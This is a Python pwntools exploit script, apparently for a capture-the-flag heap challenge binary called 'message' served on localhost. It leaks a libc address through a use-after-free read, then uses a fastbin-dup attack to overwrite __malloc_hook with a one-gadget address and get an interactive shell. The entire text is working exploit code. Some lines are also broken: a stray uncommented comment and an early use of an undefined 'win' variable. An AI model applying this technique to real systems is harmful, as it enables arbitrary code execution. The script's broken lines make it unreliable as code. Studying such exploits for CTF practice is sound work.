#!/usr/bin/python3
from pwn import *
#binary setup
elf = context.binary = ELF('./message')
context.terminal = ['tmux', 'splitw', '-hp', '70']
gs = '''
continue
'''
libc = elf.libc
index = 0
def start():
    if args.GDB:
        return gdb.debug('./message', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./message')
#add a message
def malloc(size, data):
    global index
    r.sendline("0")
    r.sendline(f"{size}")
    r.sendline(data)
    index += 1
    return index - 1
    print("index, ",index-1)
#remove the message
def free(index):
    r.sendline("1")
    r.sendline(f"{index}")
    #r.recvuntil("choice :")
#show the message
def show(index):
    r.sendline("2")
    sleep(0.2)
    r.sendline(f"{index}")
    resp = r.recv(0x58)
    #r.recvuntil("choice :")
    return resp
#3 change the timestamp
def change(index):
    r.sendline("3")
    r.sendline(f"{index}")

r = start()
#========= exploit here ===================
#sleeps for the buffering of the binary
#===== LEAK ==========
leak = malloc(0x200, "A" *8)
sleep(0.3)
guard = malloc(0x18, "YYYYYYYY")
r.timeout = 0.1
show(leak) #ctipe first
sleep(0.3)
free(leak) #free chunk
sleep(0.3)
show(leak) #show leak
#it seems im buffering the output so some timeouts
#maybe there's a better way to do it
r.recvuntil("Message : ")
r.timeout = 0.1
sleep(0.3)
r.recvuntil("Message : ")
r.timeout = 0.1
l = u64(r.recvline().strip().ljust(8,b'\x00'))
libc.address = l - 0x399b78
#no mitigations for fake chunk sizes
log.info(f"libc leak {hex(l)}")
log.info(f"libc base {hex(libc.address)}")
log.info(f"malloc hook {hex(libc.sym.__malloc_hook)}")
log.info(f"free hook {hex(libc.sym.__free_hook)}")

#============ redirecting flow of execution =====

#double free (cuidado con el topfast)
#since we have a stamp date lets try to create fake chunks
#allocating 2 chunks and a top one to anchor
top_fast = malloc(96, "X"*8)
sleep(0.3)
A = malloc(96, p64(0x71) + p64(libc.sym.__malloc_hook-16))#fake chunk near malloc hook
sleep(0.3)
B = malloc(96, "B"*8)
sleep(0.3)
r.timeout = 0.1
#free (not double free lest stack them manually)
free(top_fast)
sleep(0.3)
free(A)
sleep(0.3)
free(B)
sleep(0.3)
#change the stamp 3 times will add 0x10
change(B)
sleep(0.3)
change(B)
sleep(0.3)
change(B)
sleep(0.3)
setting up the fastbindup attack
C = malloc(96, "C"* 32)
sleep(0.3)
D = malloc(96, "D"* 32)
sleep(0.3)
win - 0xdeadbeef
malloc(96, b"A" *11 + win)

win = p64(libc.address + 0xd6701)
#win - 0xdeadbeef
malloc(96, b"A" *11 + win)
sleep(0.3)
malloc(24, "Y") #trigger malloc_hook

#========= interactive ====================
r.interactive()
